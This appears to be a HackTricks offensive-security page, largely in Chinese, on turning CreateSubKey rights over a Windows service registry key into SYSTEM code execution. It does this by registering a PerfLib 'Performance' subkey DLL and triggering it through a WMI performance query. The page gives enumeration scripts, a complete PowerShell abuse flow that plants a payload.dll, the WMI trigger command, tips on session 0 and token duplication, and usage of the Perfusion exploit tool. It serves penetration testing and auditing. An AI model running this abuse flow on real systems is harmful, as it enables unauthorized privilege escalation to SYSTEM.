# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**原始文章是** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Summary

如果你在某个 service registry key 上只有 **`Create Subkey`** / **`AppendData/AddSubdirectory`**，这仍然是一个不错的 privesc 线索。通常你**不能**直接覆盖 `ImagePath`、`ServiceDll` 或其他已有 value，但你仍可能能够在以下位置下创建一个 **`Performance`** 子键：

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- 任何其他 **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key，只要你的 token 具有 **`KEY_CREATE_SUB_KEY`**

关键点在于 Windows 仍然支持旧的 **PerfLib V1** registration model。如果某个 service 有一个 **`Performance`** 子键，当某个 performance counter consumer 请求数据时，Windows 可能会从那里加载一个 DLL。

根据 Microsoft 文档，最小注册信息是：
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
所以这个 offensive takeaway 是：**不要只因为你只拿到了 `CreateSubKey` 而不是 `SetValue`，就把一个 service registry 发现直接丢掉**。

## Why this is enough for code execution

`Performance` 子键通常默认**不存在**于这些 services 上，所以你需要的 primitive 就是 **`KEY_CREATE_SUB_KEY`**。一旦该 key 存在，并且包含 `Library`/`Open`/`Collect`/`Close`，任何 **performance counter consumer** 都可以触发 DLL 加载。

几个重要细节：

- **`Library`** 值可以指向一个 **完整的 DLL path**。
- DLL 必须导出 **`OpenPerfData`**、**`CollectPerfData`** 和 **`ClosePerfData`**，并返回 `ERROR_SUCCESS`。
- 代码运行在 **consumer 的 context** 中，**不一定**运行在 vulnerable service process 本身。
- 在经典的 `RpcEptMapper` / `Dnscache` 场景中，**WMI performance query** 可以让 **`wmiprvse.exe`** 以 **`NT AUTHORITY\SYSTEM`** 身份加载 DLL。

这就是为什么这个 primitive 在 triage 时很容易被忽略：父 service key 不是“完全可写”，但它仍然可以被 weaponize。

## Quick enumeration

使用 **AccessChk** 手动 spot-check：
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
用于查找在 service keys 上具有 **`CreateSubKey`** 的低权限 principals 的 PowerShell 示例：
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
有用的工具：

- **PrivescCheck**: `Get-ModifiableRegistryPath` 是专门为发现这类问题而创建的。
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: 在旧的易受攻击目标上自动化 DLL drop、`Performance` 注册、WMI trigger、token duplication 和清理（例如：`Perfusion.exe -c cmd -i -k Dnscache`）。

## Abuse flow

创建 `Performance` 子键并填充所需的值：
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
然后触发一个**特权**的 performance consumer。一个经典示例是对 `Win32_Perf*` 类的 WMI 查询：
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operational notes:

- 启动 **`perfmon.exe`** 有助于验证 counter registration 是否正确，但这通常只会在 **你自己的用户上下文** 中加载 DLL。
- 对于实际的 LPE，触发一个特权的 consumer，例如 **WMI**。
- 如果你在编写自己的 exploit，从 DLL 内部直接启动 `cmd.exe` 通常只会让你在 **session 0** 中拿到一个 shell。`Perfusion` 通过将特权 token 复制到一个在攻击者 session 中以 suspended 状态创建的进程来解决这个问题。
- 将 DLL 架构与目标 consumer 匹配（**x64 on x64 systems**）。

## Version notes / recent developments

Historically, the built-in weak keys were:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` and `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` notes that the **April 2021** updates removed the easy exploitation path on updated **Windows 8 / Windows Server 2012**, while **Windows 7 / Windows Server 2008 R2** remained exploitable through **`Dnscache`**.

This primitive is **not only historical**. In **January 2025**, Microsoft patched a related AD DS issue where members of **`Network Configuration Operators`** could create subkeys under **`Dnscache`** and **`NetBT`**, and the same **Performance-counter DLL registration** idea could be reused to reach **SYSTEM** on supported systems.

So the modern lesson is generic: whenever a low-privileged principal has **`CreateSubKey`** on **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, check whether a **`Performance`** child key is enough before dismissing the finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
